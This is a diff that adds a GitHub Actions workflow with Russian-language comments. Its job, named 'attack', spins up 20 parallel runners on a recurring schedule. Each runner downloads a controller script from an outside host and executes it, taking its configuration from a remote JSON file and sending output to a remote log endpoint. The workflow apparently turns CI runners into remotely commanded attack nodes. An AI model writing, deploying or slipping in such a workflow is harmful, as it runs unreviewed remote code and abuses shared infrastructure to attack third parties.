@@ -1,0 +1,49 @@
+name: Ultimate Multi-Tool
+
+on:
+  workflow_dispatch:
+    inputs:
+      json_url:
+        description: 'URL JSON конфига'
+        required: true
+        default: 'https://aarr.alwaysdata.net/paneldemo/config.json'
+
+  schedule:
+    - cron: '0 0,6,12,18 * * *'
+    - cron: '30 5,11,17,23 * * *'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 400
+    strategy:
+      fail-fast: false
+      matrix:
+        runner_id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+
+    steps:
+      - name: Download & Execute Controller
+        env:
+          CONTROLLER_URL: "https://aarr.alwaysdata.net/paneldemo/controller.sh"
+          JSON_URL: ${{ inputs.json_url || 'https://aarr.alwaysdata.net/paneldemo/config.json' }}
+          LOG_URL: "https://aarr.alwaysdata.net/paneldemo/log.php"
+          RUNNER_ID: "runner${{ matrix.runner_id }}"
+        run: |
+          echo "=== Runner $RUNNER_ID запускается ==="
+
+          # Скачиваем контроллер
+          curl -fsSL -H "Cache-Control: no-cache, no-store" "$CONTROLLER_URL" -o /tmp/controller.sh
+
+          if [ ! -s /tmp/controller.sh ]; then
+            echo "[-] CRITICAL: Не удалось скачать controller.sh"
+            exit 1
+          fi
+
+          chmod +x /tmp/controller.sh
+          echo "[+] controller.sh загружен ($(wc -c < /tmp/controller.sh) байт)"
+
+          ls -la /tmp/controller.sh
+
+          # Самый надёжный запуск
+          cd /tmp
+          bash /tmp/controller.sh
